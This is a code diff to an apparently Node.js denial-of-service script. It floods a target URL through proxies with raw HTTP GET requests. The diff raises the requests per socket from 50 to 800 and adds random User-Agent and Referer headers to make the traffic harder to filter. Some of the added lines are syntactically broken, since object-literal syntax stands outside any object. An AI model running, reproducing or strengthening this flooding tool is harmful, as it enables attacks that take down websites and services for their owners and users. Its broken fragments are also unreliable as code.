@@ -9,6 +9,10 @@ var target = process.argv[2];
 var time = process.argv[4];
 var host = url.parse(target).host;
 var theproxy = 0;
+userAgents: [...new Set(fs.readFileSync('ua.txt', 'utf-8').replace(/\r/g, '').split('\n'))],
+get randomUA() {
+    return workerData.userAgents[~~(Math.random() * workerData.userAgents.length)]
+}
 var proxy = proxies[theproxy];
 var int = setInterval(() => 
 {
@@ -24,9 +28,9 @@ var int = setInterval(() =>
     }
         var s = require('net').Socket();
         s.connect(proxy[1], proxy[0]);
-        s.setTimeout(10000);
-        for (var i = 0; i < 50; i++) {
-            s.write('GET ' + target + '/ HTTP/1.1\r\nHost: ' + host + '\r\nConnection: Keep-Alive\r\n\r\n');
+        s.setTimeout(5000);
+        for (var i = 0; i < 800; i++) {
+            s.write('GET ' + target + ' HTTP/1.1\r\nHost: ' + host + '\r\nReferer: ' + target + '\r\nUser-Agent: ' + randomUA() + '\r\nConnection: Keep-Alive\r\n\r\n');
         }
         s.on('data', function () { setTimeout(function () { s.destroy(); return delete s; }, 5000); })
 });
